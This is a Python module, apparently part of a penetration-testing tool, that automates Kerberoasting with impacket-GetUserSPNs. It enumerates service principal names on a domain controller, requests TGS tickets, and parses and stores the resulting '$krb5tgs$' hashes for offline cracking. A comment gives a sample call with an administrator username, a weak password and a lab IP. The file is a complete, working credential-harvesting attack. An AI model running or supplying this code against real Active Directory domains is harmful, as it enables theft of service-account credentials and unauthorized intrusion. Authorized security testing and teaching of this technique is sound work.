from datetime import datetime, timezone
import subprocess

from ..db.database import upsert_user_hash
# run_kerberoast('gikyon.local', 'Administrator', 'Admin@123', '192.168.80.132')
# app/utils/
def check_kerberoast(domain, username, password, target_ip):
    creds = f"{domain}/{username}:{password}"

    output = subprocess.run(
        ['impacket-GetUserSPNs', '-dc-ip', target_ip, creds],
        capture_output=True,
        text=True
    )

    result_withbanner = output.stdout.splitlines()
    result = result_withbanner[4:]
    formatted = []
    for line in result:
        information = line.split()
        if len(information) > 3:
            formatted.append(f"{information[1]} - {information[0]}")
    return formatted


def run_kerberoast(domain, username, password, target_ip):
    creds = f"{domain}/{username}:{password}"

    output = subprocess.run(
        ['impacket-GetUserSPNs', '-dc-ip', target_ip, creds, '-request'],
        capture_output=True,
        text=True
    )

    result = []

    for line in output.stdout.splitlines():
        if "$krb5tgs$" in line:
            parsed = _parse_kerberoast_hash(line)
            if parsed:
                timestamp = datetime.now(timezone.utc).isoformat()
                upsert_user_hash(parsed["username"], "kerberosHash", parsed["hash"], timestamp)
                parsed["timestamp"] = timestamp
                result.append(parsed)
            else:
                result.append({
                    "username": "Unknown",
                    "hash": line,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                })

    return result


def _parse_kerberoast_hash(hash_line):
    parts = hash_line.split("$")
    if len(parts) < 5:
        return None

    user_part = parts[3]
    if not user_part.startswith("*"):
        return None

    username = user_part.lstrip("*")
    if not username:
        return None

    return {"username": username, "hash": hash_line}